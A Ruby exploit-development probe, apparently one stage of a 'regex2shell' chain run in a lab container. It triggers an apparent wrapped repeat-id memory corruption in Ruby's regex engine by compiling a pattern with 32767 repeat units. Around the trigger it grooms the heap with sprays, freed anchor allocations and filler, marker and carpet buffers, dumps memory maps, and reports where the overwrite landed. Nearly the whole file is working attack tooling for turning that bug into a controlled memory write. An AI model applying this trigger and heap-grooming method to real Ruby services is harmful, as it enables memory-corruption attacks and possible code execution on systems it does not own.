# probe_map.rb — regex2shell stage-3 layout probe (runs inside the vuln container).
#
# Replicates the render.rb 're' allocation sequence standalone so the engine's
# compile-time and match-time big allocations can be attributed to VMA regions
# (pair with lab/probe/bigalloc.c via LD_PRELOAD). Parameterized by ENV:
#
#   UNITS      plain repeat units (default 32767 -> single wrapped id -32768)
#   ANCHOR     anchor string bytes, 0 = off (default 2097152, the iter-2 shape)
#   FILLERS    1 = post-compile filler plug (default), 0 = off
#   SPRAY      embedded 10-char strings for new heap pages (default 60000)
#   PHASE      extra units to shift every write 8 bytes closer to the page
#
# Dumps /proc/self/maps at three points (pre-compile, pre-match, post-match),
# scans the spray for corrupted RVALUE lengths, and reports match outcome.
require 'json'

units   = Integer(ENV.fetch('UNITS', '32767'))
anchor  = Integer(ENV.fetch('ANCHOR', '2097152'))
fillers = ENV.fetch('FILLERS', '1') == '1'
spray_n = Integer(ENV.fetch('SPRAY', '60000'))
phase   = Integer(ENV.fetch('PHASE', '0'))
markers_n = Integer(ENV.fetch('MARKERS', '0'))       # 'M'*4096 buffers, scanned post-match
anchor_pre = ENV.fetch('ANCHOR_PRE', '0') == '1'     # anchor allocated BEFORE compile, freed after

def dump_maps(tag)
  File.write("/tmp/maps-#{tag}.txt",
             File.read('/proc/self/maps').each_line.select do |l|
               perms = l.split[1].to_s
               perms.start_with?('r', 'w')
             end.join)
end

pattern = "(?:x{0,100}){0,100}" + "(?:foobar){0,100}" * (units + phase)
subject = 'foobar' * 6

markers = nil
anchor_str = nil
spacer = nil
if anchor.positive? && anchor_pre
  anchor_str = 'A' * anchor
  $stderr.puts "== ANCHOR_PLACED pre-compile #{anchor}"
end

$stderr.puts "== PRE_COMPILE"
dump_maps('precompile')

re = Regexp.new(pattern)
$stderr.puts "== COMPILED bytes=#{pattern.bytesize}"

# post-compile marker band: exhausts every compile-freed brk hole and then
# bump-extends the heap, so the band ends contiguous at brk top
if markers_n.positive?
  markers = Array.new(markers_n) { 'M' * 4096 }
  GC.start
  $stderr.puts "== MARKERS_PLACED #{markers_n}"
end
spacer_n = Integer(ENV.fetch('SPACER', '0'))
if spacer_n.positive?
  # live pad between the band and the anchor: pushes the anchor (and thus
  # repeat_stk and the whole write window) a chosen distance above whatever
  # live chunk sits directly below the band (here: the 192 KiB engine chunk)
  spacer = 'S' * spacer_n
end
carpet = nil
carpet_n = Integer(ENV.fetch('CARPET', '0'))
if carpet_n.positive?
  # single contiguous live target directly below the anchor: after the
  # marker band exhausts the compile-era holes, this bumps at brk top and
  # the anchor bumps right above it, so the whole write window
  # [repeat_stk-0x40000, repeat_stk) lands inside this one buffer
  carpet = 'F' * carpet_n
end

fill = nil
if fillers
  fill = [1_048_576, 524_288, 262_144, 131_072, 65_536].map { |f| 'F' * f }
end
sprayed = Array.new(spray_n) { 'p' * 10 }
GC.start

if anchor_str
  anchor_str = nil
  GC.start(full_mark: true, immediate_sweep: true)
  GC.start(full_mark: true, immediate_sweep: true)
  $stderr.puts "== ANCHOR_RELEASED #{anchor}"
elsif anchor.positive?
  a = 'A' * anchor
  a = nil
  GC.start(full_mark: true, immediate_sweep: true)
  GC.start(full_mark: true, immediate_sweep: true)
  $stderr.puts "== ANCHOR_RELEASED #{anchor}"
end

$stderr.puts "== PRE_MATCH units=#{units + phase} anchor=#{anchor}"
dump_maps('prematch')

t0 = Process.clock_gettime(Process::CLOCK_MONOTONIC)
timeout_hit = false
begin
  Regexp.timeout = Float(ENV.fetch('TIMEOUT', '30'))
  m = re.match(subject)
rescue Regexp::TimeoutError
  timeout_hit = true
  m = nil
end
dt = ((Process.clock_gettime(Process::CLOCK_MONOTONIC) - t0) * 1000).round

dump_maps('postmatch')
hits = sprayed.each_with_index.select { |s, _| s.length != 10 }
out = {
  matched: !m.nil?, match_ms: dt, timeout: timeout_hit, sprayed: sprayed.size,
  corrupted: hits.map { |_, i| { i: i, len: sprayed[i].length } }
}
if markers
  mhits = []
  markers.each_with_index do |mk, i|
    if (j = mk.index(/[^M]/))
      mhits << { marker: i, offset: j, value: mk[j, 8].unpack1('Q<') }
    end
  end
  out[:marker_hits] = mhits
end
if spacer && (j = spacer.index(/[^S]/))
  out[:spacer_hit] = { offset: j, value: spacer[j, 8].unpack1('Q<') }
end
if carpet && (j = carpet.index(/[^F]/))
  out[:carpet_hit] = { offset: j, value: carpet[j, 8].unpack1('Q<') }
end
puts JSON.generate(out)
$stderr.puts "== POST_MATCH #{JSON.generate(out)[0, 300]}"
